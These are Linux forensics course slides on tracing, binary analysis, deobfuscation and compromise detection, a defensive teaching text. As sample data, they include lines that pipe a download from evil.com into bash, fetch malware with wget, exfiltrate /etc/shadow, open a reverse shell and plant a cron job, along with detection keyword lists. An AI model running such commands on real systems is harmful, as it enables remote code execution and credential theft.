# Advanced Linux OS Analysis

## Course: Linux Forensics - Day 4 (continued)
- Advanced analysis techniques reveal deeper system behavior
- Tracing system calls and library calls exposes program actions
- Binary analysis uncovers malware functionality
- This module covers `strace`, `ltrace`, obfuscation, and `GDB`

---

## Why Advanced Analysis?

- Surface-level artifacts tell part of the story
- Programs may be obfuscated or packed
- Malware behavior must be understood dynamically
- System call tracing reveals actual program actions
- Binary analysis identifies capabilities without source code

```text
Static Analysis         Dynamic Analysis
(what the file IS)      (what the file DOES)
- file, strings         - strace, ltrace
- readelf, objdump      - GDB debugging
- disassembly           - sandbox execution
- hex analysis          - network monitoring
```

---

## `strace` - System Call Tracer

```bash
# Trace all system calls of a command
strace ls /tmp
# execve("/usr/bin/ls", ["ls", "/tmp"], ...) = 0
# openat(AT_FDCWD, "/tmp", O_RDONLY|O_DIRECTORY) = 3
# getdents64(3, ...) = 120
# write(1, "file1.txt\nfile2.txt\n", 20) = 20

# Trace a running process
strace -p 1234

# Save output to file
strace -o /evidence/trace_output.txt ls /tmp

# Trace specific system calls only
strace -e trace=open,read,write ls /tmp
strace -e trace=network nc -l 4444
strace -e trace=file cat /etc/passwd
```

---

## `strace` Forensic Techniques

```bash
# Trace file access (what files does it touch?)
strace -e trace=open,openat,stat,access,read,write \
  -o /evidence/file_trace.txt ./suspicious_binary

# Trace network activity (what connections does it make?)
strace -e trace=socket,connect,bind,listen,accept,sendto,recvfrom \
  -o /evidence/net_trace.txt ./suspicious_binary

# Trace process creation (does it spawn children?)
strace -e trace=fork,vfork,clone,execve \
  -f -o /evidence/proc_trace.txt ./suspicious_binary
# -f follows child processes

# Trace with timestamps
strace -t -o /evidence/timed_trace.txt ./suspicious_binary
strace -T -o /evidence/timed_trace.txt ./suspicious_binary
# -t = wall clock time, -T = time spent in each syscall

# Summary statistics
strace -c ls /tmp
# % time  seconds  calls  syscall
# 45.00  0.000234    12  write
# 30.00  0.000156     8  openat
```

---

## `strace` Common Patterns to Watch

```bash
# Pattern: File exfiltration
# open("/etc/shadow", O_RDONLY) = 3
# read(3, "root:$6$...", 4096) = 2345
# socket(AF_INET, SOCK_STREAM, 0) = 4
# connect(4, {sa_family=AF_INET, sin_port=htons(4443),
#   sin_addr=inet_addr("10.0.0.1")}, 16) = 0
# write(4, "root:$6$...", 2345) = 2345

# Pattern: Reverse shell
# socket(AF_INET, SOCK_STREAM, 0) = 3
# connect(3, {sa_family=AF_INET, sin_port=htons(4443), ...}) = 0
# dup2(3, 0) = 0    <- redirect stdin
# dup2(3, 1) = 1    <- redirect stdout
# dup2(3, 2) = 2    <- redirect stderr
# execve("/bin/sh", ["/bin/sh"], ...) = 0

# Pattern: Persistence installation
# openat(AT_FDCWD, "/etc/cron.d/update", O_WRONLY|O_CREAT) = 3
# write(3, "* * * * * root /tmp/.x\n", 23) = 23
```

---

## `ltrace` - Library Call Tracer

```bash
# Trace shared library calls
ltrace ls /tmp
# strcmp(".", ".")  = 0
# strcmp("..", ".") = 1
# strlen("file1.txt") = 9
# puts("file1.txt") = 10

# Trace specific library
ltrace -l libc.so.6 ./suspicious_binary

# Trace with timestamps
ltrace -t ./suspicious_binary

# Save output
ltrace -o /evidence/ltrace_output.txt ./suspicious_binary

# Trace a running process
ltrace -p 1234
```

---

## `ltrace` Forensic Patterns

```bash
# Pattern: String manipulation (building commands)
# strcat("wget ", "http://evil.com/")  = "wget http://evil.com/"
# system("wget http://evil.com/malware")  = 0

# Pattern: Encryption/encoding
# EVP_EncryptInit(0x7fff..., 0x7f..., "secret_key", "iv12345")
# EVP_EncryptUpdate(...)
# base64_encode(...)

# Pattern: DNS resolution
# gethostbyname("c2-server.evil.com") = 0x7f...
# getaddrinfo("c2-server.evil.com", "443", ...) = 0

# Pattern: File operations with string arguments
# fopen("/etc/passwd", "r") = 0x55...
# fgets("root:x:0:0:...", 1024, 0x55...) = 0x55...

# Combine strace and ltrace for complete picture
```

---

## Static Binary Analysis

```bash
# Basic file identification
file suspicious_binary
# suspicious_binary: ELF 64-bit LSB executable, x86-64,
# dynamically linked, stripped

# Key indicators:
# "stripped" = symbol table removed (harder to analyze)
# "statically linked" = all libraries included
# "dynamically linked" = uses shared libraries

# Check for linking
ldd suspicious_binary
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
# libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0

# Extract printable strings
strings suspicious_binary | head -40
strings -n 12 suspicious_binary  # Longer strings only

# Look for interesting strings
strings suspicious_binary | grep -iE \
  "http|ftp|ssh|password|/bin/sh|/etc|socket|connect|exec"
```

---

## ELF Analysis with `readelf`

```bash
# ELF header
readelf -h suspicious_binary
# Entry point address: 0x401060

# Program headers (segments)
readelf -l suspicious_binary
# LOAD  0x0000000000000000  r--  0x1000
# LOAD  0x0000000000001000  r-x  0x2000  <- executable code
# LOAD  0x0000000000003000  rw-  0x1000  <- writable data

# Section headers
readelf -S suspicious_binary
# .text    - executable code
# .rodata  - read-only data (strings, constants)
# .data    - initialized data
# .bss     - uninitialized data

# Symbol table (if not stripped)
readelf -s suspicious_binary

# Dynamic symbols and dependencies
readelf -d suspicious_binary
```

---

## Detecting Obfuscation

```bash
# Signs of obfuscation/packing:

# 1. High entropy (encrypted/compressed sections)
ent suspicious_binary
# Entropy > 7.0 bits/byte suggests packing

# 2. Very few readable strings
strings suspicious_binary | wc -l
# Normal binary: hundreds to thousands of strings
# Packed binary: very few strings

# 3. UPX packing detection
strings suspicious_binary | grep UPX
# "UPX!" = UPX packed binary

# Unpack UPX
upx -d suspicious_binary -o unpacked_binary

# 4. Section names
readelf -S suspicious_binary
# Unusual section names: .upx0, .packed, etc.

# 5. Entry point in unusual section
readelf -h suspicious_binary
# Entry point NOT in .text section = suspicious
```

---

## Disassembly with `objdump`

```bash
# Disassemble all sections
objdump -d suspicious_binary | head -50

# Disassemble specific section
objdump -d -j .text suspicious_binary | head -50

# Disassemble with source (if debug info present)
objdump -dS suspicious_binary

# Show all headers
objdump -x suspicious_binary

# Show dynamic relocations
objdump -R suspicious_binary

# Intel syntax (more readable)
objdump -d -M intel suspicious_binary | head -50

# Example output:
# 0000000000401060 <_start>:
#   401060: 48 89 e7    mov rdi, rsp
#   401063: 48 83 e4 f0 and rsp, 0xfffffffffffffff0
#   401067: e8 f4 00 00 call 401160 <main>
```

---

## Introduction to `GDB`

```bash
# GDB - GNU Debugger
# Essential for dynamic binary analysis

# Start GDB with a binary
gdb ./suspicious_binary

# GDB commands:
# (gdb) info file         # Show file info
# (gdb) info functions    # List known functions
# (gdb) info registers    # Show CPU registers
# (gdb) disas main        # Disassemble main function
# (gdb) break main        # Set breakpoint at main
# (gdb) run               # Start execution
# (gdb) next              # Step over
# (gdb) step              # Step into
# (gdb) continue          # Continue to next breakpoint
# (gdb) x/20x $rsp        # Examine 20 hex words at stack pointer
# (gdb) x/s 0x402000      # Examine as string at address
# (gdb) quit              # Exit GDB
```

---

## `GDB` Forensic Techniques

```bash
# Analyze a suspicious binary safely
gdb ./suspicious_binary

# Set breakpoints on interesting functions
(gdb) break connect      # Network connections
(gdb) break open         # File operations
(gdb) break execve       # Process execution
(gdb) break socket       # Socket creation
(gdb) break fork         # Process creation

# Run and examine when breakpoint hits
(gdb) run
# Breakpoint 1, connect (...)
(gdb) info registers
(gdb) bt                 # Backtrace (call stack)
(gdb) x/32x $rsp        # Examine stack

# Examine arguments to connect()
(gdb) x/16b $rsi        # sockaddr structure
# Shows IP address and port being connected to
```

---

## `GDB` Memory Examination

```bash
# Examine memory in various formats
(gdb) x/20x 0x402000     # 20 hex words
(gdb) x/20d 0x402000     # 20 decimal values
(gdb) x/20c 0x402000     # 20 characters
(gdb) x/5s 0x402000      # 5 strings
(gdb) x/10i 0x401060     # 10 instructions

# Dump memory range to file
(gdb) dump binary memory /evidence/mem_dump.bin 0x400000 0x500000

# Search memory for patterns
(gdb) find /b 0x400000, 0x500000, 0x50, 0x4b, 0x03, 0x04
# Searches for PK (ZIP) signature

# Watch for memory writes to specific address
(gdb) watch *0x603000
# Breaks when value at this address changes

# Print variable values
(gdb) print $rax
(gdb) print (char*)$rdi
```

---

## Analyzing Malware Safely

```bash
# Create isolated analysis environment

# Method 1: Using network namespaces
sudo ip netns add forensic_sandbox
sudo ip netns exec forensic_sandbox ./suspicious_binary

# Method 2: Using firejail
sudo apt install firejail
firejail --net=none --private ./suspicious_binary

# Method 3: Using Docker container
docker run --rm --network none -v /evidence:/evidence \
  ubuntu:22.04 /evidence/suspicious_binary

# Method 4: Virtual machine (recommended for dangerous samples)
# Use snapshot capability to restore state

# Always monitor with strace/ltrace during execution
firejail --net=none strace -o /evidence/trace.txt \
  ./suspicious_binary
```

---

## Analyzing Shell Scripts

```bash
# Shell scripts may be obfuscated

# Common obfuscation techniques:
# 1. Base64 encoding
echo "d2dldCBodHRwOi8vZXZpbC5jb20vbWFsd2FyZQ==" | base64 -d
# wget http://evil.com/malware

# 2. Variable substitution
# a="wg";b="et";c=" ht";d="tp://";e="evil.com"
# $a$b$c$d$e/malware

# 3. Hex encoding
# echo -e "\x77\x67\x65\x74"  # = wget

# 4. eval with encoded strings
# eval $(echo "d2dldCBodHRwOi8v..." | base64 -d)

# De-obfuscation:
# Replace eval/exec with echo to see what would execute
# Add set -x (trace mode) at start of script
# Use bash -n script.sh for syntax check without execution
```

---

## Analyzing Python Scripts

```bash
# Python malware/tools may be compiled or obfuscated

# Decompile .pyc files
sudo apt install python3-pip
pip3 install uncompyle6

uncompyle6 malware.pyc > malware_decompiled.py

# For exe packed with PyInstaller
pip3 install pyinstxtractor
python3 pyinstxtractor.py malware.exe
# Extracts .pyc files from the executable

# Common Python obfuscation:
# exec(base64.b64decode("..."))
# eval(compile(...))
# marshal.loads(...)

# De-obfuscate: replace exec/eval with print
# to see what code would be executed
```

---

## Analyzing Compiled Go Binaries

```bash
# Go binaries are statically linked and often large
file go_binary
# go_binary: ELF 64-bit LSB executable, statically linked, Go

# Go binaries contain rich symbol information
strings go_binary | grep "main\."
# main.main
# main.exfiltrateData
# main.connectC2
# main.encryptFile

# Go version
strings go_binary | grep "go1\."
# go1.21.5

# Analyze Go binary structure
go tool objdump go_binary | head -50

# Go binaries often have:
# - Embedded file paths from build environment
# - Build timestamps
# - Module dependency information
strings go_binary | grep -E "^/"
```

---

## Process Memory Analysis

```bash
# Dump process memory for analysis
# Method 1: /proc filesystem
cat /proc/1234/maps  # View memory regions
# 00400000-00401000 r--p  /path/to/binary
# 00401000-00402000 r-xp  /path/to/binary  <- code
# 7f...            rw-p  [heap]
# 7fff...          rw-p  [stack]

# Dump specific region
dd if=/proc/1234/mem bs=1 skip=$((0x400000)) \
  count=$((0x1000)) > /evidence/region_dump.bin 2>/dev/null

# Method 2: GDB
gdb -p 1234
(gdb) generate-core-file /evidence/core_dump
(gdb) detach

# Method 3: gcore utility
gcore -o /evidence/core_dump 1234

# Analyze core dump
strings /evidence/core_dump | grep -i password
```

---

## Network Traffic Analysis with Binary Context

```bash
# Capture traffic generated by suspicious binary
# Terminal 1: Start capture
sudo tcpdump -i any -w /evidence/malware_traffic.pcap &

# Terminal 2: Run binary in sandbox
strace -e trace=network ./suspicious_binary

# Terminal 1: Stop capture
sudo kill %1

# Analyze captured traffic
tcpdump -r /evidence/malware_traffic.pcap -n

# Extract DNS queries
tcpdump -r /evidence/malware_traffic.pcap -n port 53

# Look for C2 communication patterns
tcpdump -r /evidence/malware_traffic.pcap -A | \
  grep -iE "user-agent|host:|GET |POST "

# Open in Wireshark for detailed analysis
wireshark /evidence/malware_traffic.pcap
```

---

## Anti-Forensics Detection

```bash
# Common anti-forensics techniques and how to detect them

# 1. Log deletion
ls -la /var/log/  # Check for small/empty/missing logs
stat /var/log/auth.log  # Check modification times

# 2. Timestamp manipulation (timestomping)
# ctime cannot be set by touch - compare mtime vs ctime
stat /path/to/file
# If mtime is BEFORE ctime, timestamps may be manipulated

# 3. History deletion
cat /home/user/.bash_history
# Look for: unset HISTFILE, HISTSIZE=0, history -c
# Missing history = suspicious

# 4. Secure deletion
# Look for tools: shred, srm, wipe, dd of=/dev/zero
grep -rn "shred\|srm\|wipe" /home/*/.bash_history 2>/dev/null

# 5. Rootkit indicators
chkrootkit
rkhunter --check
```

---

## Exercise: Advanced Analysis Lab

### Tasks:
1. Use `strace` to trace a sample program's behavior
2. Use `ltrace` to identify library calls
3. Analyze a binary with `strings` and `readelf`
4. Set breakpoints in `GDB` and examine execution
5. De-obfuscate a simple encoded shell script

```bash
# Quick analysis workflow for suspicious binary
echo "=== File Type ==="
file suspicious_binary
echo "=== Strings ==="
strings suspicious_binary | grep -iE "http|exec|shell|password"
echo "=== Libraries ==="
ldd suspicious_binary
echo "=== ELF Info ==="
readelf -h suspicious_binary
echo "=== Entropy ==="
ent suspicious_binary | head -1
echo "=== Syscall Summary ==="
timeout 10 strace -c ./suspicious_binary 2>&1
```

---

## Summary: Advanced Linux Analysis

- `strace` traces system calls revealing file, network, and process operations
- `ltrace` traces library calls showing higher-level function usage
- Static analysis (`file`, `strings`, `readelf`) identifies binary properties
- Obfuscation detection uses entropy analysis and string density
- `objdump` disassembles binaries for code inspection
- `GDB` enables dynamic analysis with breakpoints and memory examination
- Always analyze malware in isolated environments (sandbox/VM)
- Shell script de-obfuscation replaces eval/exec with echo
- Process memory dumps may contain passwords and encryption keys
- Anti-forensics detection requires awareness of tampering techniques
- Combine static and dynamic analysis for comprehensive understanding

---

## Analyzing Cron Job Payloads

```bash
# Malicious cron jobs often download and execute payloads

# Example suspicious cron entry:
# * * * * * root curl -s http://evil.com/b | bash

# Deobfuscate cron payloads:
# Step 1: Download the payload (in sandbox)
curl -s http://evil.com/b > /evidence/cron_payload.sh

# Step 2: Analyze without executing
cat /evidence/cron_payload.sh
# May contain:
# - Cryptocurrency miner installation
# - Backdoor deployment
# - Data exfiltration
# - Lateral movement scripts

# Step 3: Check for encoded content
grep -oP '[A-Za-z0-9+/]{40,}={0,2}' /evidence/cron_payload.sh | \
  while read b64; do
    echo "=== Decoded ==="
    echo "$b64" | base64 -d 2>/dev/null
  done
```

---

## Analyzing Shared Libraries

```bash
# Malicious shared libraries can intercept function calls

# Check LD_PRELOAD (most common injection vector)
cat /etc/ld.so.preload
# Should be empty or not exist
# If contains a .so file = likely rootkit/backdoor

# Check environment for LD_PRELOAD
grep -r "LD_PRELOAD" /etc/environment /etc/profile.d/ \
  /etc/bash.bashrc /home/*/.bashrc 2>/dev/null

# List shared libraries used by a binary
ldd /usr/bin/sudo
# libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0

# Check library loading order
LD_DEBUG=libs /usr/bin/ls 2>&1 | head -20

# Verify library hashes
for lib in /lib/x86_64-linux-gnu/lib*.so*; do
  sha256sum "$lib"
done > /evidence/lib_hashes.txt

# Compare against known-good
dpkg -V libc6 2>/dev/null
```

---

## Process Injection Detection

```bash
# Process injection inserts code into running processes

# Check for processes with modified memory maps
for pid in /proc/[0-9]*/; do
  maps=$(cat "$pid/maps" 2>/dev/null)
  # Look for anonymous executable mappings
  if echo "$maps" | grep -q "rwxp.*\[.*\]"; then
    echo "SUSPICIOUS: PID $(basename $pid) has RWX anonymous mapping"
  fi
  # Look for memory mapped deleted files
  if echo "$maps" | grep -q "(deleted)"; then
    echo "DELETED MAPPING: PID $(basename $pid)"
    echo "$maps" | grep "(deleted)"
  fi
done 2>/dev/null

# Check for ptrace attachments
grep -l "TracerPid:[^0]" /proc/*/status 2>/dev/null | \
  while read f; do
    pid=$(echo "$f" | cut -d/ -f3)
    tracer=$(grep TracerPid "$f" | awk '{print $2}')
    echo "PID $pid is being traced by PID $tracer"
  done
```

---

## Analyzing Log Tampering

```bash
# Detect evidence of log manipulation

# Check for timestamp inconsistencies
awk '{print $1,$2,$3}' /var/log/auth.log | sort -c 2>&1
# If sort complains, timestamps are out of order = tampering

# Check for gaps in log sequence
awk '{print $1,$2,$3}' /var/log/syslog | uniq -c | \
  awk '$1 > 1 {print "GAP:", $0}'

# Check log file modification times vs content
stat /var/log/auth.log
# Compare file mtime with last entry timestamp
tail -1 /var/log/auth.log

# Check for truncated logs
ls -la /var/log/auth.log
# Unusually small file = possible truncation

# Check for missing log files
ls -la /var/log/
# Expected files that are missing:
# btmp, wtmp, lastlog should always exist

# Compare journal entries with text logs
# Discrepancies may indicate text log tampering
journalctl _COMM=sshd --since "2025-01-15" | wc -l
grep "sshd" /var/log/auth.log | grep "Jan 15" | wc -l
```

---

## Analyzing Network Protocols

```bash
# Deep protocol analysis with tshark (command-line Wireshark)

# HTTP traffic analysis
tshark -r /evidence/capture.pcap -Y "http" \
  -T fields -e ip.src -e http.request.uri -e http.user_agent

# DNS queries
tshark -r /evidence/capture.pcap -Y "dns.qr==0" \
  -T fields -e ip.src -e dns.qry.name

# TLS/SSL certificate information
tshark -r /evidence/capture.pcap -Y "tls.handshake.type==11" \
  -T fields -e tls.handshake.certificate

# Extract files from HTTP traffic
tshark -r /evidence/capture.pcap --export-objects http,/evidence/http_objects/

# SMTP email extraction
tshark -r /evidence/capture.pcap -Y "smtp" \
  -T fields -e smtp.req.parameter

# Follow TCP stream
tshark -r /evidence/capture.pcap -z "follow,tcp,ascii,0"
```

---

## Malware Communication Patterns

```bash
# Identify C2 (Command and Control) patterns

# Beaconing detection (regular intervals)
tshark -r /evidence/capture.pcap -Y "ip.dst==10.0.0.1" \
  -T fields -e frame.time_relative | \
  awk '{diff=$1-prev; prev=$1; if(NR>1) print diff}' | \
  sort -n | uniq -c | sort -rn | head -5
# Consistent intervals suggest beaconing

# DNS tunneling detection
tshark -r /evidence/capture.pcap -Y "dns.qry.name" \
  -T fields -e dns.qry.name | \
  awk -F. '{print length($1)}' | sort -rn | head -10
# Long subdomain names suggest DNS tunneling

# HTTP beaconing with unusual user agents
tshark -r /evidence/capture.pcap -Y "http.user_agent" \
  -T fields -e http.user_agent | sort | uniq -c | sort -rn

# Large outbound data transfers (exfiltration)
tshark -r /evidence/capture.pcap -Y "ip.src==10.0.0.5" \
  -T fields -e ip.dst -e tcp.len | \
  awk '{sum[$1]+=$2} END {for(ip in sum) print sum[ip], ip}' | \
  sort -rn | head -10
```

---

## Cryptocurrency Miner Detection

```bash
# Signs of cryptocurrency mining on compromised systems

# High CPU usage processes
ps aux --sort=-%cpu | head -10

# Known mining process names
ps aux | grep -iE "xmrig|minerd|cpuminer|stratum|cryptonight|monero"

# Mining pool connections
ss -tnp | grep -E ":3333|:4444|:5555|:8888|:14444"
# Common mining pool ports

# Check for mining configuration files
find / -name "config.json" -exec grep -l "pool\|stratum\|wallet" {} \; \
  2>/dev/null

# CPU usage anomalies in logs
journalctl | grep -i "high.*cpu\|temperature\|throttl"

# Cron jobs running miners
grep -rn "xmrig\|minerd\|stratum\|cryptonight" \
  /etc/cron* /var/spool/cron/ 2>/dev/null

# Check /tmp and /dev/shm for miner binaries
find /tmp /dev/shm /var/tmp -type f -executable 2>/dev/null | \
  xargs file 2>/dev/null | grep "ELF"
```

---

## Analyzing Systemd Service Exploitation

```bash
# Systemd services can be exploited for privilege escalation

# Check for writable service files
find /etc/systemd /lib/systemd -name "*.service" -writable 2>/dev/null

# Check for services running as root with user-writable paths
for f in /etc/systemd/system/*.service /lib/systemd/system/*.service; do
  [ -f "$f" ] || continue
  exec_path=$(grep "^ExecStart=" "$f" | head -1 | cut -d= -f2 | awk '{print $1}')
  if [ -n "$exec_path" ] && [ -w "$exec_path" ] 2>/dev/null; then
    echo "WRITABLE EXEC: $f -> $exec_path"
  fi
done

# Check for PATH hijacking in services
grep "^ExecStart=" /etc/systemd/system/*.service 2>/dev/null | \
  grep -v "^/" # Commands without full path = PATH hijackable

# Analyze timer-triggered services
systemctl list-timers | while read line; do
  unit=$(echo "$line" | awk '{print $NF}')
  systemctl cat "$unit" 2>/dev/null
done
```

---

## Reverse Engineering with `radare2`

```bash
# radare2 - advanced reverse engineering framework
sudo apt install radare2

# Open binary for analysis
r2 -A suspicious_binary
# -A = analyze all functions

# r2 commands:
# afl          - list all functions
# pdf @main    - disassemble main function
# iz           - list strings in data section
# ii           - list imports
# ie           - list entry points
# iS           - list sections
# axt @sym.connect - find cross-references to connect()

# Visual mode
# V            - enter visual mode
# VV           - enter graph mode
# p/P          - cycle through visual panels

# Search for patterns
# /x 2f6574632f - search for hex string (/etc/)
# / password    - search for ASCII string
```

---

## Container Escape Detection

```bash
# Check if current environment is a container
# Indicators of container environment:
cat /proc/1/cgroup | grep -E "docker|lxc|kubepods"

# Check for .dockerenv file
ls /.dockerenv 2>/dev/null && echo "Inside Docker container"

# Check for container escape artifacts
# 1. Mounted host filesystems
mount | grep -E "ext4|xfs" | grep -v "overlay"

# 2. Host PID namespace access
ls /proc/*/root/etc/hostname 2>/dev/null | head -5

# 3. Docker socket access (allows container escape)
ls -la /var/run/docker.sock
# If accessible from within container = security issue

# 4. Privileged container indicators
cat /proc/self/status | grep CapEff
# 0000003fffffffff = all capabilities = privileged

# 5. Host network namespace
ip addr | grep -c "eth\|ens\|wlan"
# Many interfaces in container = host network mode
```

---

## eBPF and Tracing for Forensics

```bash
# eBPF tools provide deep system observability

# Install bcc tools
sudo apt install bpfcc-tools

# Trace all file opens
sudo opensnoop-bpfcc
# PID    COMM       FD  FILE
# 1234   malware    3   /etc/shadow

# Trace all exec calls
sudo execsnoop-bpfcc
# PCOMM  PID    RET  ARGS
# bash   5679   0    /tmp/.hidden/tool -c 10.0.0.1

# Trace TCP connections
sudo tcpconnect-bpfcc
# PID    COMM  SADDR      DADDR      DPORT
# 6789   tool  10.0.0.5   10.0.0.1   4443

# Trace DNS requests
sudo gethostlatency-bpfcc

# Trace file reads/writes by process
sudo filetop-bpfcc

# These tools leave minimal forensic footprint
# Useful for live investigation before imaging
```

---

## Analyzing SELinux/AppArmor Violations

```bash
# SELinux denials indicate unauthorized behavior

# Check SELinux denials
sudo ausearch -m avc -ts today
# type=AVC msg=audit(...): avc: denied { read } for
#   pid=6789 comm="malware" name="shadow"
#   tcontext=system_u:object_r:shadow_t:s0

# Generate human-readable SELinux report
sudo sealert -a /var/log/audit/audit.log

# AppArmor violations
sudo dmesg | grep "apparmor.*DENIED"
# Or:
journalctl -k | grep "apparmor.*DENIED"

# View AppArmor profile status
sudo aa-status
# 25 profiles in enforce mode
# 0 profiles in complain mode

# Check if profile was disabled (suspicious)
grep -r "flags=(complain)" /etc/apparmor.d/
```

---

## Analyzing Core Dumps for Evidence

```bash
# Core dumps contain process state at crash time

# List available core dumps
coredumpctl list
# TIME      PID  UID  GID  SIG  COREFILE  EXE
# Jan 15    6789 0    0    11   present   /tmp/.hidden/tool

# Extract core dump
coredumpctl dump 6789 -o /evidence/crash_dump.core

# Analyze with GDB
gdb /tmp/.hidden/tool /evidence/crash_dump.core
(gdb) bt              # Backtrace at crash
(gdb) info registers  # Register state
(gdb) info threads    # All threads
(gdb) x/100s $rsp     # Strings near stack pointer

# Extract strings from core dump
strings /evidence/crash_dump.core | grep -iE \
  "password|key|secret|token" > /evidence/core_strings.txt

# Core dumps may reveal:
# - Passwords in memory
# - Network addresses
# - File paths
# - Command arguments
# - Encryption keys
```
